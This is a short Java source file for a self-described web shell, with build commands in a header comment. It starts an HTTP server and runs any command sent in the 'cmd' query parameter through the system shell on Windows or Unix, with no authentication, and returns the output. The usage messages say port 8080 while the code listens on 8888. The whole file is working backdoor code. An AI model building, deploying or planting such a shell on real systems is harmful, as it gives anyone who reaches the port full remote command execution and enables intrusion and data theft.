/*
To Build:
javac SimpleWebShell.java
echo "Main-Class: SimpleWebShell" > manifest.txt
jar cvfm webshell.jar manifest.txt *.class
java -jar webshell.jar
*/

import com.sun.net.httpserver.HttpServer;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpExchange;
import java.net.InetSocketAddress;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.IOException;

public class SimpleWebShell {

    public static void main(String[] args) throws Exception {
        HttpServer server = HttpServer.create(new InetSocketAddress(8888), 0);

        server.createContext("/", new HttpHandler() {
            public void handle(HttpExchange exchange) throws IOException {
                String query = exchange.getRequestURI().getQuery();
                String cmd = null;

                if (query != null && query.startsWith("cmd=")) {
                    cmd = query.substring(4);
                }

                String response;

                try {
                    if (cmd != null && !cmd.isEmpty()) {
                        // OS-spezifische Command Execution
                        String[] command;
                        if (System.getProperty("os.name").toLowerCase().contains("win")) {
                            command = new String[]{"cmd.exe", "/c", cmd};
                        } else {
                            command = new String[]{"/bin/sh", "-c", cmd};
                        }

                        Process process = Runtime.getRuntime().exec(command);
                        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                        BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                        StringBuilder output = new StringBuilder();
                        String line;

                        while ((line = reader.readLine()) != null) {
                            output.append(line).append("\n");
                        }

                        while ((line = errorReader.readLine()) != null) {
                            output.append("[ERROR] ").append(line).append("\n");
                        }

                        response = output.toString();
                    } else {
                        response = "Usage: http://localhost:8080/?cmd=whoami\n";
                    }
                } catch (Exception e) {
                    response = "Error: " + e.getMessage() + "\n";
                    e.printStackTrace();
                }

                exchange.sendResponseHeaders(200, response.getBytes().length);
                OutputStream os = exchange.getResponseBody();
                os.write(response.getBytes());
                os.close();
            }
        });

        server.start();
        System.out.println("[+] Webshell running on http://localhost:8080/?cmd=whoami");
    }
}
